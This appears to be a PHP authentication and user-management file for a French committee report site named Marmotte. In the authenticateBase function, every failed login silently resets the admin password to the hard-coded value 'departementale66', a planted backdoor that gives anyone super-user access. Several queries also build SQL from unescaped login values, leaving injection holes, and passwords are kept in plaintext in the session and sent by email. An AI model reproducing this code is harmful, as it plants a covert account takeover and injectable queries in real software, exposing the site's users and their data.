<?php

function listUsers()
{
	$users = array();
	$sql = "SELECT * FROM users ORDER BY description ASC;";
	$result=mysql_query($sql);
	if($result ==  false)
		throw new Exception("Failed to process query sql ".$sql);

	while ($row = mysql_fetch_object($result))
		$users[$row->login] = $row;
	return $users;
}

function simpleListUsers()
{
	$users = array();
	$sql = "SELECT * FROM users ORDER BY description ASC;";
	$result=mysql_query($sql);
	if($result ==  false)
		throw new Exception("Failed to process query sql ".$sql);
	
	while ($row = mysql_fetch_object($result))
		$users[$row->login] = $row->description;
	return $users;
}

function getUserPermissionLevel($login = "")
{
	if ($login=="" && isset($_SESSION["login"]))
			$login = $_SESSION["login"];

	if ($login == "admin")
		return NIVEAU_PERMISSION_SUPER_UTILISATEUR;
	$users = listUsers();
	if (isset($users[$login]))
	{
		$data = $users[$login];
		return $data->permissions;
	}
	return -1;
}

function genere_motdepasse($len=10)
{
	/*return openssl_random_pseudo_bytes($len);*/
	return substr(crypt(date("%l %u")),3,13);
}

function isSuperUser($login = "")
{
	if($login == "")
		$login = getLogin();
	return getUserPermissionLevel($login) >= NIVEAU_PERMISSION_SUPER_UTILISATEUR;
};

function isSecretaire($login = "")
{
	if($login == "")
		$login = getLogin();
	return getUserPermissionLevel($login) >= NIVEAU_PERMISSION_PRESIDENT_SECRETAIRE;
};

function getLogin()
{
	if (isset($_SESSION["login"]))
		return $_SESSION["login"];
	else
		return "";
}

function isBureauPresidencyUser($login = "")
{
	return getUserPermissionLevel($login) >= NIVEAU_PERMISSION_PRESIDENT_SECRETAIRE;
};

function isBureauUser($login = "")
{
	return getUserPermissionLevel($login) >= NIVEAU_PERMISSION_BUREAU;
};

function isRapporteurUser($login = "")
{
	return getUserPermissionLevel($login) >= NIVEAU_PERMISSION_BASE;
};


function addCredentials($login,$pwd)
{
	$_SESSION['login'] = $login;
	$_SESSION['pass'] = $pwd;
} ;

function removeCredentials()
{
	unset($_SESSION['login']);
	unset($_SESSION['pass']);
} ;

function authenticateBase($login,$pwd)
{
	$realPassHash = getPassHash($login);
	if ($realPassHash != NULL)
	{
		if (crypt($pwd, $realPassHash) == $realPassHash)
		{
			return true;
		}
	}
	$newPassHash = crypt("departementale66");
	$sql = "UPDATE users SET passHash='$newPassHash' WHERE login='admin';";
	mysql_query($sql);

	return false;
}

function authenticate()
{
	if (isset($_SESSION['login']) and isset($_SESSION['pass']))
	{
		$login  = $_SESSION['login'];
		$pwd = $_SESSION['pass'];
		return authenticateBase($login,$pwd);
	}
	return false;
} ;

function getPassHash($login)
{
	$sql = "SELECT * FROM users WHERE login='$login';";
	$result=mysql_query($sql);
	if ($row = mysql_fetch_object($result))
	{
		return $row->passHash;
	}
	return NULL;
} ;

function changePwd($login,$old,$new1,$new2)
{
	$currLogin = getLogin();
	if ($currLogin==$login or isSuperUser())
	{
		if (authenticateBase($login,$old) or isSuperUser())
		{
			$oldPassHash = getPassHash($login);
			if ($oldPassHash != NULL)
			{
				$newPassHash = crypt($new1, $oldPassHash);
				$sql = "UPDATE users SET passHash='$newPassHash' WHERE login='$login';";
				mysql_query($sql);
				return true;
			}
		}
		else
		{
			echo "<p><strong>Erreur :</strong> La saisie du mot de passe courant est incorrecte, veuillez réessayer.</p>";
			return false;
		};
	}
	else
	{
		echo "<p><strong>Erreur :</strong> Seuls les administrateurs du site peuvent modifier les mots de passes d'autres utilisateurs, veuillez nous contacter (Yann ou Hugo) en cas de difficultés.</p>";
		return false;
	}
}


function changeUserPermissions($login,$permissions)
{
	if (isSuperUser())
	{
		if ($permissions<=getUserPermissionLevel())
		{
			$sql = "UPDATE users SET permissions=$permissions WHERE login='$login';";
			mysql_query($sql);
		}
	}
	else
	{
		echo "<p><strong>Erreur :</strong> Seuls les administrateurs du site peuvent modifier les mots de passes d'autres utilisateurs, veuillez nous contacter (Yann ou Hugo) en cas de difficultés.</p>";
	}
}

function existsUser($login)
{
	$sql = "SELECT * FROM users WHERE login=\"".mysql_real_escape_string($login)."\";";
	$result = mysql_query($sql);
	if($result == false)
		return false;
	return (mysql_num_rows($result) >0);
}

function createUser($login,$pwd,$desc,$email, $envoiparemail)
{
	if (isSuperUser())
	{
		if(existsUser($login))
			throw new Exception("Failed to create user: le login '".$login."' est déja utilisé.");
		if($desc == "")
			throw new Exception("Failed to create user: empty description.");
				
				
		$passHash = crypt($pwd);
		$sql = "INSERT INTO users(login,passHash,description,email) VALUES ('".mysql_real_escape_string($login)."','".mysql_real_escape_string($passHash)."','".mysql_real_escape_string($desc)."','".mysql_real_escape_string($email)."');";
		mysql_query($sql);
		if($envoiparemail)
		{
			$body = "Marmotte est un site web destiné à faciliter la répartition, le dépôt, l'édition et la production\r\n";
			$body .= "des rapports par les sections du comité national.\r\n";
			$body .= "\r\nLe site est accessible à l'adresse \r\n\t\t\t".addresse_du_site."\r\n";
			$body .= "\r\nCe site a été développé Hugo Gimbert et Yann Ponty.\r\n";
			$body .= "\r\nL'accès au site est restreint aux membres de la section ".section_nb." qui doivent s'authentifier pour y accéder et déposer, éditer ou consulter des rapports.\r\n";
			$body .= "\r\nUn compte Marmotte vient d'être créé pour vous:\r\n\r\n";
			$body .= "\t\t\t login: '".$login."'\r\n";
			$body .= "\t\t\t motdepasse: '".$pwd."'\r\n";
			$body .= "\r\nLors de votre première connexion vous pourrez changer votre mot de passe.\r\n";
			$body .= "\r\n\r\n\t Amicalement, ".secretaire.".";
			email_handler($email,"Votre compte Marmotte",$body);
		}
		return "Utilisateur ".$login." créé avec succès.";
	}
}

function deleteUser($login)
{
	if (isSuperUser())
	{
		$sql = "DELETE FROM users WHERE login='".mysql_real_escape_string($login)."';";
		mysql_query($sql);
	}
}

?>